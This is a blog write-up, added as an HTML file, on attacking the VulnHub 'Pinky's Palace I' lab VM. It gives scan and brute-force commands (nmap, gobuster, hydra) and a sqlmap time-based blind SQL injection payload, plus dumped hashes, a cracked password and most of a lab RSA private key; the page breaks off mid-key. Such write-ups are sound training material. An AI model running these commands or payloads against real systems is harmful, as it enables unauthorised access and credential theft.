@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>EN: Hacking VulnHub Machine - Pinky&#39;s Palace I :: Foxtrotlabs — In the middle of somewhere</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**But we are Poles and we are not afraid of dictionary attacks** A funny quote from the Internet  0x00 Gooood moooornnnnin&amp;rsquo; Internetnam! After a looooong time, I&amp;rsquo;ve finally managed to spend some time on writing. There is more to go, but for now - let&amp;rsquo;s dive into VulnHub VM - our target today is a well known Pinky&amp;rsquo;s Palace I by Pink_Panther.
+By the way I also recommend his OSCP failing post, that shows why failing is not the end of the world, but the beginning of the journey!" />
+<meta name="keywords" content="hacking" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://foxtrotlabs.cc/2018/07/en-hacking-vulnhub-machine-pinkys-palace-i/" />
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-148414315-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://foxtrotlabs.cc/assets/style.css">
+
+  <link rel="stylesheet" href="https://foxtrotlabs.cc/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="foxtrot_charlie" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="EN: Hacking VulnHub Machine - Pinky&#39;s Palace I :: Foxtrotlabs">
+<meta property="og:description" content="**But we are Poles and we are not afraid of dictionary attacks** A funny quote from the Internet  0x00 Gooood moooornnnnin&amp;rsquo; Internetnam! After a looooong time, I&amp;rsquo;ve finally managed to spend some time on writing. There is more to go, but for now - let&amp;rsquo;s dive into VulnHub VM - our target today is a well known Pinky&amp;rsquo;s Palace I by Pink_Panther.
+By the way I also recommend his OSCP failing post, that shows why failing is not the end of the world, but the beginning of the journey!" />
+<meta property="og:url" content="https://foxtrotlabs.cc/2018/07/en-hacking-vulnhub-machine-pinkys-palace-i/" />
+<meta property="og:site_name" content="EN: Hacking VulnHub Machine - Pinky&#39;s Palace I" />
+
+  
+    <meta property="og:image" content="">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="pentest" />
+
+  <meta property="article:section" content="ctf" />
+
+  <meta property="article:section" content="hacking" />
+
+  <meta property="article:section" content="en" />
+
+  <meta property="article:section" content="security" />
+
+
+  <meta property="article:published_time" content="2018-07-24 13:36:50 &#43;0200 &#43;0200" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://foxtrotlabs.cc/en">
+  <div class="logo">
+    foxtrotlabs-en
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://foxtrotlabs.cc/posts">posts</a></li>
+        
+      
+        
+          <li><a href="https://foxtrotlabs.cc/pl">Polish side</a></li>
+        
+      
+        
+          <li><a href="https://foxtrotlabs.cc/about">about</a></li>
+        
+      
+        
+          <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://foxtrotlabs.cc/posts">posts</a></li>
+      
+    
+      
+        <li><a href="https://foxtrotlabs.cc/pl">Polish side</a></li>
+      
+    
+      
+        <li><a href="https://foxtrotlabs.cc/about">about</a></li>
+      
+    
+      
+        <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-148414315-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://foxtrotlabs.cc/2018/07/en-hacking-vulnhub-machine-pinkys-palace-i/">EN: Hacking VulnHub Machine - Pinky&rsquo;s Palace I</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2018-07-24 
+      </span>
+    
+    
+    <span class="post-author">::
+      foxtrot_charlie
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://foxtrotlabs.cc/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/ctf/">CTF</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/vulnhub/">vulnhub</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/pinky/">pinky</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/palace/">palace</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/pinkys-palace-i/">Pinky&#39;s Palace I</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/boot2root/">boot2root</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/virtual-machine/">virtual machine</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <center>**But we are Poles and we are not afraid of dictionary attacks**</center>
+<div style="text-align: right"> A funny quote from the Internet </div>
+<h3 id="0x00-gooood-moooornnnnin-internetnam">0x00 Gooood moooornnnnin&rsquo; Internetnam!<a href="#0x00-gooood-moooornnnnin-internetnam" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>After a looooong time, I&rsquo;ve finally managed to spend some time on writing. There is more to go, but for now - let&rsquo;s dive into <a href="https://www.vulnhub.com/">VulnHub</a> VM - our target today is a well known <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">Pinky&rsquo;s Palace I</a> by <a href="https://twitter.com/@Pink_P4nther">Pink_Panther</a>.</p>
+<p>By the way I also recommend his <a href="https://pinkysplanet.net/failing-the-oscp-exam/">OSCP failing</a> post, that shows why failing is not the end of the world, but the beginning of the journey!</p>
+<h3 id="0x01-starting-point">0x01 Starting point<a href="#0x01-starting-point" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>To do this challenge I needed to download the image (it&rsquo;s an <code>*.ova</code> file - this is a single file distribution of <a href="https://en.wikipedia.org/wiki/Open_Virtualization_Format">Open Virtualization Format</a> and it&rsquo;s supported by Virtualbox - it just needs importing). After successful import simply start the VM (what&rsquo;s important, network configuration will be imported too, this enables interaction with the guest machine).</p>
+<p>It&rsquo;s boot time!</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/booting.png" alt="booting img"></p>
+<p>While waiting on VM to start, I&rsquo;ve started reading description. It says that:</p>
+<pre><code>A realistic Boot2Root box. Gain access to the system and read the root.txt.
+
+</code></pre><p>Ok, so our job is to pwn this system and read some file called <code>root.txt</code>. It will be <em>probably</em> some file that belongs to <code>root</code> user, so <em>perhaps</em> I will need to do some kind of PrivEsc with cron or sticky bit - <a href="https://en.wikipedia.org/wiki/Sticky_bit">ref</a>.</p>
+<p>I&rsquo;m just guessing now since I&rsquo;m writing this post during pwning.</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/booted.png" alt="important info"></p>
+<p>Machine is now up&amp;runnin&rsquo; so let&rsquo;s look what we&rsquo;ve got here. It&rsquo;s just a tty1 login prompt. I don&rsquo;t know nither the password nor the login, so probably there is no need to login here.
+Login prompt provides alse an information about IP address (which is <code>192.168.88.242</code> in this case), and target - the file <code>/root/root.txt</code>.</p>
+<h3 id="0x02-let-the-pentest-begin">0x02 Let the pentest begin!<a href="#0x02-let-the-pentest-begin" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The target machine is visible in internal Virtualbox network. This will be the way to get in. I could probably cheat and just try to mount this VM&rsquo;s drive with another distro and try printing the flag - but it&rsquo;s not the case here. I will not cheat (as long as I don&rsquo;t have to) here.</p>
+<p>First things first. Of course now the IP address of that VM is known by login prompt, but in case there is no such info provided, one can use <code>netdiscover</code> tool or <code>nmap</code> to find the right host in the network. I will skip this part.</p>
+<h6 id="0x0200-recon---asap-scanning">0x02.00 Recon - !ASAP scanning<a href="#0x0200-recon---asap-scanning" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>If you work in some kind of corporation environment (with open space and another goodies, the term <em>ASAP</em> will make you panic, but stay calm! I mean <code>not As Stealthy As Possible</code> - this will be clarified in this paragraph).</p>
+<p>The most famous scanning tool is <code>nmap</code> &ldquo;the scanner&rdquo;. Let&rsquo;s use it to figure out which ports are in use, fingerprint the target OS and check for known services running. I will use <code>-T5</code> switch which will make <code>nmap</code> to scan aggressively. Why is that? It&rsquo;s unlikely to have IDS in this challenge and blue-team on the other side of the monitor that is hunting for attackers. So it will make scan faster by limiting scan&rsquo;s delays. You can read about this feature <a href="https://nmap.org/book/man-performance.html">here</a></p>
+<p>Syn-scan mode with <code>-sV</code> option enabled returned that there are 3 ports in use. This is the most important part of this scan:</p>
+<pre><code>PORT      STATE SERVICE    VERSION
+8080/tcp  open  http       nginx 1.10.3
+31337/tcp open  http-proxy Squid http proxy 3.5.23
+64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>So we have some GNU/Linux OS running on that machine with nginx 1.10.3 onboard on port 8080, a Squid http proxy on 31337 port and a ssh service running on unusual port 64666. Banners were enabled so the <code>nmap</code> was able to provide info about version.</p>
+<p>On pentests I like to run <a href="https://github.com/vulnersCom/nmap-vulners"><code>vulners</code></a> NSE script for nmap. I did that here, the log looks like:</p>
+<pre><code>nmap -sV --script vulners -p 8080,31337,64666 192.168.88.242
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-23 23:57 CEST
+Nmap scan report for 192.168.88.242
+Host is up (0.018s latency).
+
+PORT      STATE SERVICE    VERSION
+8080/tcp  open  http       nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+31337/tcp open  http-proxy Squid http proxy 3.5.23
+|_http-server-header: squid/3.5.23
+| vulners: 
+|   cpe:/a:squid-cache:squid:3.5.23: 
+|   CVE-2018-1000027        5.0     https://vulners.com/cve/CVE-2018-1000027
+|_  CVE-2018-1000024        5.0     https://vulners.com/cve/CVE-2018-1000024
+64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:7.4p1: 
+|_  CVE-2017-15906      5.0     https://vulners.com/cve/CVE-2017-15906
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
+
+</code></pre><p>It&rsquo;s just shopping around for low hanging fruits. Obtaining the shell is just the first step. But in this case there is nothing so <code>interesting</code> to look at. So let&rsquo;s try that webservice on port 8080.</p>
+<h6 id="0x0201-smashing-the-server-with-headget-requests---dirbusting-time">0x02.01 Smashing the server with HEAD/GET requests - dirbusting time!<a href="#0x0201-smashing-the-server-with-headget-requests---dirbusting-time" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<pre><code>403 Forbidden
+______________
+nginx/1.10.3
+</code></pre><p>Well, nothing to see here? Let&rsquo;s try to guess some directories. I will use my favourite tool for that - <a href="https://github.com/OJ/gobuster"><code>gobuster</code></a>, it&rsquo;s something like <code>dirbuster</code> but written in <code>Go</code>. It&rsquo;s fast and has nice CLI. I&rsquo;m using standard dirbuster dictionary - medium here.</p>
+<pre><code>foxtrotc@raptor:somewhere/gobuster$ go run main.go -w ../dirbuster-ng/wordlists/directory-list-2.3-medium.txt  -fw -o pinkyspalace -u http://192.168.88.242:8080 -k -t 150 -s 200,204,302,307
+
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.88.242:8080/
+[+] Threads      : 150
+[+] Wordlist     : ../dirbuster-ng/wordlists/directory-list-2.3-medium.txt
+[+] Output file  : pinkyspalace
+[+] Status codes : 200,204,302,307
+=====================================================
+
+</code></pre><p>If you don&rsquo;t get all of these parameters, just look at repository.</p>
+<p>The greatest disadvantage of this tool is lack of a progressbar. I hate waiting&hellip; Well, I&rsquo;m trying to add this feature to <code>gobuster</code> so I hope there will be a PR soon.</p>
+<p>While I&rsquo;m waiting and my computer is smashing that VM with a great amount of requests, there is the time to take a look at this Squid Proxy. It&rsquo;s a multiplatform proxy, really popular on Linux boxes. It can optimise web surfing or help bypass access restrictions. My first thought was to try visiting :8080 port (http server) via this proxy.</p>
+<p>To do this I&rsquo;ve set up <code>FoxyProxy</code> plugin on FF. Unfortunately, this plugin have changed on past few years. If you have better alternative for fast proxy switching tool for normal Firefox - please let me know on twitter.</p>
+<p>Redirecting traffic via proxy and pointing browser to <code>192.168.88.242:8080</code> gave me, well&hellip; <code>403 Forbidden</code>. I&rsquo;ve corrected my mistake and going to the address without specified port gave me an error page.</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/errorpage.png" alt="error page"></p>
+<pre><code>ERROR
+The requested URL could not be retrieved
+[...]
+The system returned: (111) Connection refused
+[...]
+Generated Mon, 23 Jul 2018 22:25:07 GMT by pinkys-palace (squid/3.5.23)
+</code></pre><p>So this http proxy was created to enable access to the webserver. On apache server this can be done by .htaccess, and here on nginx - via global configuration. Neat, but too obvious :P don&rsquo;t do this at home kids!</p>
+<p>Dirbusting gave me nothing. After adding <code>-p</code> switch with proxy settings - still nothing. That made me <strong>really</strong> confused. Ok, let&rsquo;s try another way!</p>
+<p>At this point I&rsquo;ve started reading things on <code>vulners.com</code> that were provided by my <code>nmap</code> scan. But that was also the dead end.</p>
+<p>On that website, there was also a link, to send automatic email about <em>hackup</em> to the administrator. First of all I thought that this is some kind of CSRF - a long link with URL-encoded data&hellip; But checking it out showed this:</p>
+<pre><code>CacheHost: pinkys-palace
+ErrPage: ERR_CONNECT_FAIL
+Err: (111) Connection refused
+TimeStamp: Mon, 23 Jul 2018 22:25:07 GMT
+
+ClientIP: 192.168.88.244
+ServerIP: 192.168.88.242
+
+HTTP Request:
+GET / HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Host: 192.168.88.242 
+</code></pre><p>This is a standard GET request that caused a failure. At the first glance, I haven&rsquo;t found anything special about it, but one thing was particularly interesting. This line:</p>
+<pre><code>CacheHost: pinkys-palace
+</code></pre><p>Combined with the footer of earlier error message:</p>
+<pre><code>Generated Mon, 23 Jul 2018 22:25:07 GMT by pinkys-palace (squid/3.5.23)
+</code></pre><p>Got me into thinking about resolving hosts&hellip; And tadam! By an accident I&rsquo;ve found the way to access that website. Just swap the IP address with the term <code>pinkys-palace</code>, and done! Or&hellip; ok, not done, but yet another step in some direction.</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/pinkys_palace1.png" alt="cute website"></p>
+<p>Ok, so this is the cutest website I&rsquo;ve ever seen in a lovely color. But still, this means nothing. Redirecting the browser to <code>/login</code> page gave the <code>404</code>. So this is yet another try of using dirbuster. This time on <code>pinkys-palace:8080</code>. Fingers crossed!</p>
+<pre><code>foxtrotc@raptor:~/gobuster$ go run main.go -w ../dirbuster-ng/wordlists/directory-list-2.3-medium.txt  -fw -u http://pinkys-palace:8080 -k -t 250 -s 200,204,302,307,301 --p http://192.168.88.242:31337  
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://pinkys-palace:8080/
+[+] Threads      : 250
+[+] Wordlist     : ../dirbuster-ng/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 204,302,307,200,301
+[+] Proxy        : http://192.168.88.242:31337
+=====================================================
+</code></pre><p>This is another long run for gobuster. But this time - <em>BINGO!</em>. Using the phrase <code>littlesecrets-main</code>, the <code>gobuster</code> found a redirection (<code>HTTP 301</code>).</p>
+<pre><code>=====================================================
+Found : /littlesecrets-main (Status: 301)
+=====================================================
+</code></pre><p>This time going to that address gives the login page!</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/login_page1.png" alt="login page"></p>
+<p>To be honest - I will never guess this by hand. But it&rsquo;s good to have <code>directory-list-2.3-medium.txt</code> dictionary. BTW, I&rsquo;ve grepped this file for line number - the solution for this website is placed pretty far:</p>
+<pre><code>foxtrotc@raptor:dirbuster-ng/wordlists$ grep -nr littlesecrets directory-list-2.3-medium.txt 
+75769:littlesecrets
+83074:littlesecrets-password
+83084:littlesecrets-main
+</code></pre><p>Ok, so this is yet another foothold in hacking this machine. Let&rsquo;s note it down and move to the last part of recon - <code>secure shell</code>.</p>
+<h6 id="0x0203-how-about-ssh">0x02.03 How about SSH?<a href="#0x0203-how-about-ssh" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>First of all, the banner says <code>SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u2</code>. As <code>vulners</code> script for the scan showed, there is a <a href="https://vulners.com/cve/CVE-2017-15906">vuln</a> for that, but as description says:</p>
+<pre><code>The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.
+</code></pre><p>It&rsquo;s not as valuable as it could be and in my opinion, that&rsquo;s not the case here. It doesn&rsquo;t enable a way to gain access to that box. BTW, I like <a href="https://www.cvedetails.com/cve/CVE-2017-15906/">this</a> website, because it has a nice and clear table with what privileges are required and what can be done by exploitation.</p>
+<p>So at this point, there is nothing obvious left to do - it&rsquo;s the time for <strong>HACKING</strong>!!! <sub><sup> (in case the next phase will not end with success I will iteratively loop over deeper recon - exploitation) </sup></sub></p>
+<h3 id="0x03-exploitation">0x03 Exploitation<a href="#0x03-exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Here comes the tricky part. With the intel provided it&rsquo;s time to obtain the shell on that machine. Let&rsquo;s start with some webapp pentesting. It&rsquo;s time to fire up <code>Burp</code> proxy. To start using it with the host proxy, I had to go to <code>User options</code> -&gt; then setup the <code>Upstream Proxy Server</code> as follows:</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/proxy_setup_burp.png" alt="burp proxy"></p>
+<p>That&rsquo;s all. Now <code>Burp</code> will direct all requests made by browser and forwarded in <code>Proxy</code> via <code>192.168.88.242</code>.</p>
+<h6 id="0x0300-blind-sqli">0x03.00 [BLIND] SQLi<a href="#0x0300-blind-sqli" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>Login pages are good places for SQLi. Trying the most popular</p>
+<pre><code>&quot; or &quot;&quot;=&quot;
+</code></pre><p>failed and <code>login.php</code> script returned <code>Incorrect Username or Password</code>, but I&rsquo;ve also captured the POST request:</p>
+<pre><code>POST http://pinkys-palace:8080/littlesecrets-main/login.php HTTP/1.1
+Host: pinkys-palace:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://pinkys-palace:8080/littlesecrets-main/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+
+user=asdf&amp;pass=asdf
+</code></pre><p>Now I can try some bruteforce to gain access to this website. My tool of choice is <code>hydra</code>. The command used to start the attack looks like this:</p>
+<pre><code>hydra pinkys-palace -l admin -P ./wordlist/rockyou.txt http-post-form &quot;/littlesecrets-main/login.php:user=^USER^&amp;pass=^PASS^:Incorrect Username or Password&quot; -I -t 50 -s 8080
+</code></pre><p>But to get that working, the proxy must be set up. It can be done by exporting local variable.</p>
+<pre><code>export HYDRA_PROXY_HTTP=http://192.168.88.242:31337
+</code></pre><p><code>THC Hydra</code> can also use the <code>sock4/sock5</code> proxies (specified by <code>HYDRA_PROXY=socksX</code> env variable). The cracking speed is swift, so I&rsquo;ve wanted to try another ideas before hammering with <code>Hydra</code> finishes.</p>
+<p>Meanwhile I was looking around for <code>sqlmap</code> my <code>Hydra</code> killed the host - well, that can happen sometimes. It looks like that my bruteforce turned into <code>DOS</code>. 😬</p>
+<pre><code>[STATUS] 2815.00 tries/min, 8445 tries in 00:13h, 35953 to do in 0:33h, 64 active
+[ERROR] Child with pid 13083 terminating, cannot connect
+[ERROR] Child with pid 13056 terminating, cannot connect
+[ERROR] Child with pid 13099 terminating, cannot connect
+[...]
+</code></pre><p>I&rsquo;ve decided to restart the target machine and run <code>sqlmap</code> only. The command looks like this:</p>
+<pre><code>foxtrotc@raptor:~ $ sqlmap --dbms=mysql --data=&quot;user=adm&amp;pass=passw&amp;submit=Login&quot; --url http://pinkys-palace:8080/littlesecrets-main/login.php --level=5 --risk=3 --dump-all --proxy=http://192.168.88.242:31337
+</code></pre><p>Of course the proxy setting is set.</p>
+<p>At first it doesn&rsquo;t look promising:</p>
+<pre><code>[20:34:30] [WARNING] POST parameter 'user' does not seem to be injectable
+[20:34:30] [INFO] testing if POST parameter 'pass' is dynamic
+[20:34:30] [WARNING] POST parameter 'pass' does not appear to be dynamic
+[20:34:30] [WARNING] heuristic (basic) test shows that POST parameter 'pass' might not be injectable
+</code></pre><p>But after quite a long time it looks like we have something:</p>
+<pre><code>User-Agent parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 64508 HTTP(s) requests:
+---
+Parameter: User-Agent (User-Agent)
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind
+    Payload: sqlmap/1.2.7#pip (http://sqlmap.org)'||(SELECT 'PGhK' FROM DUAL WHERE 4975=4975 AND SLEEP(5))||'
+---
+</code></pre><p>Watching the data being determined (I mean tables in database, logins) by <code>sqlmap</code> in timing attack is pretty satisfying. I would suggest to do not run any other automated tools during blind sqli attack - it may cause disruptions and false positives by overloading the network.</p>
+<pre><code>[...]
+[23:02:47] [WARNING] unable to retrieve the number of entries for table 'logs' in database 'pinky_sec_db'
+[23:02:47] [INFO] fetching columns for table 'users' in database 'pinky_sec_db'
+[23:02:47] [INFO] retrieved: 3
+[23:02:51] [INFO] retrieved: uid
+[23:03:01] [INFO] retrieved: user
+[23:03:14] [INFO] retrieved: pass
+[23:03:29] [INFO] fetching entries for table 'users' in database 'pinky_sec_db'
+[23:03:29] [INFO] fetching number of entries for table 'users' in database 'pinky_sec_db'
+[23:03:29] [INFO] retrieved: 2
+[23:03:31] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+pinky
+[23:03:51] [INFO] retrieved: f543dbfeaf238729831a321c7a68bee4
+[23:05:35] [INFO] retrieved: 1
+[23:05:37] [INFO] retrieved: pinkymanage
+[23:06:11] [INFO] retrieved: d60dffed7cc0d87e1f4a11aa06ca73af
+[23:07:58] [INFO] retrieved: 2
+[23:08:01] [INFO] recognized possible password hashes in column 'pass'
+[...]
+</code></pre><p>After some time (rather long than short, be patient!) here is the result:</p>
+<pre><code>+-----+----------------------------------+-------------+
+| uid | pass                             | user        |
++-----+----------------------------------+-------------+
+| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
+| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
++-----+----------------------------------+-------------+
+</code></pre><p>Blind SQL injection attack determined two users and passwords. I guess that these are hashes (it looks like <code>MD5</code>), but just to be sure I&rsquo;ve tried them without cracking - no luck.</p>
+<p>There are many ways of cracking MD5. I prefer to look them up in Google or just any online service that stores strings and corresponding hashes. Due the reason this is the challenge task, by <em>pinky&rsquo;s</em> hash I&rsquo;ve encountered links to writeups. It&rsquo;s not a good idea to cheat and look for answers, so I&rsquo;ve decided to search for the second hash. If it had failed - I would have set up my GPU rig with <code>hashcat</code> and few giant dicts + some rules.</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/crackstation.png" alt="crackstation"></p>
+<p>Bingo! The hash was reversed on <a href="https://crackstation.net/">crackstation</a>, the password was <code>3pinkysaf33pinkysaf3</code>. Too bad for me, it doesn&rsquo;t work with punkys-palace website #sadface.</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/burp_login_attempt.png" alt="challenge_login"></p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/burp_login_fail.png" alt="response_login"></p>
+<h6 id="0x0301-obtaining-the-shell">0x03.01 Obtaining the shell<a href="#0x0301-obtaining-the-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>Since it&rsquo;s the challenge (yup, pentest are usually slightly different), I&rsquo;ve tried to login to the <code>ssh</code> using credentials for <code>pinkymanage</code> user.</p>
+<p>This was easy! Let&rsquo;s try printing <code>/root/root.txt</code>:</p>
+<pre><code>pinkymanage@pinkys-palace:~$ cat /root/root.txt
+cat: /root/root.txt: Permission denied
+</code></pre><p>So the challenge is not done yet! It&rsquo;s time for some priviliage escalation fun!</p>
+<h6 id="0x0302-privesc-pwn-that-box">0x03.02 PrivEsc [PWN THAT BOX!]<a href="#0x0302-privesc-pwn-that-box" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<pre><code>pinkymanage@pinkys-palace:~$ sudo whoami 
+[sudo] password for pinkymanage: 
+pinkymanage is not in the sudoers file.  This incident will be reported.
+</code></pre><p>Well, it looks like that user <code>pinkymanage</code> is not a sudoer.</p>
+<pre><code>pinkymanage@pinkys-palace:/var/www/pinkymanage/.ssh$ cat known_hosts 
+ |1|ddPO6l4PJ+hR883AkBxnqZwLqV0=|Dc3nHxLXil9FeR5kQ5KCU0+Ziug= ecdsa-sha2-nistp256
+ AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZDIHslZJXVJH6dCHGaJRVy8WUL
+ ZGgoqkKe8gfp/jibTQiMe8lIE8zFX2S8aXxWo4kSBd6i94zKj4YR2TcFj2o=
+</code></pre><pre><code>pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ 
+&gt;cat note.txt 
+Hmm just in case I get locked out of my server I put this rsa key here.. 
+Nobody will find it heh..
+</code></pre><p>That&rsquo;s a hint. <code>ls -la</code> shows .dotfile, which is called <code>ultrasecret</code>.</p>
+<p>The <code>.ultrasecret</code> file is a base64-encoded RSA key.</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA16fxL3/+h/ILTZewkvekhIQ1yk0oLI+y3N4AItkhez11Iha8
+Hc7KOx/L9g2jd3H8dGPUfKKr9seqtg97ZKA95S/sb4w3Qtl1ABu/pVKZBbGGsHG/
+yIvGEPKS+BSZ4stMW7Hnx7ciMuhwcZwLqZmsySumECTueQswNPblITlrqolpYF8x
+e47El9pHwewNWcIrmqraxCH5TC7UhjgGaQwmW3qHyrSqp/jK/ctb1ZpnPv+DC833
+u/Tyjm6z8RaDZG/gRBIrMGnNbg4pZFhtgbGVOf7feGvBFR8BiT+7VFfO7yEvyBx9
+gxrySxu2Z0aOM8QR6MGaDMjYUnB9aTYuw8GP4wIDAQABAoIBAA6iH7SIa94Pp4Kx
+W1LtqOUxD3FVwPcdHRbtnXa/4wy4w9z3S/Z91K0kYDOnA0OUoXvIVl/Krf6F1+iY
+rlfKo8iMcu+yxQEtPkoul9eA/k8rl6cbYNcb3OnDfAOHalXAU8MZFFAx9gkcSpz6
+6LOucNIJuy/3QZNHFhNR+YRCoDKnFnEILxYL5Wz2qptWMYDuwtmGzO968YbLrOV1
+okWN6gMiEi5qprBh5a8wBRQVaBrLYWg8WeXfWfkGzKoxKPFKzhI5j4/EkxLDJqt3
+LA7JRxmFn77/mbvaDW8WZX0fOcS8ugyRBEN0VpdnF6kl6tfOXKGj0gd+gAiw0TVR
+2CB7PsECgYEA8IW3ZsKtbCkRBtF+VTBq4K46s7ShW9AZ6+bpb+d1NRT5xRJG+Dsz
+F3cg4N+39nYg8mFwsBhn/szgVBNWZouWrRNrDExH0yu6HOJ7zLWQayUhQJiIPxpc
+n/Eed6SrcySfzgmntOib4hyGjF0/wntjMc73xuAVNuO8A6WW+hgVHKECgYEA5YiW
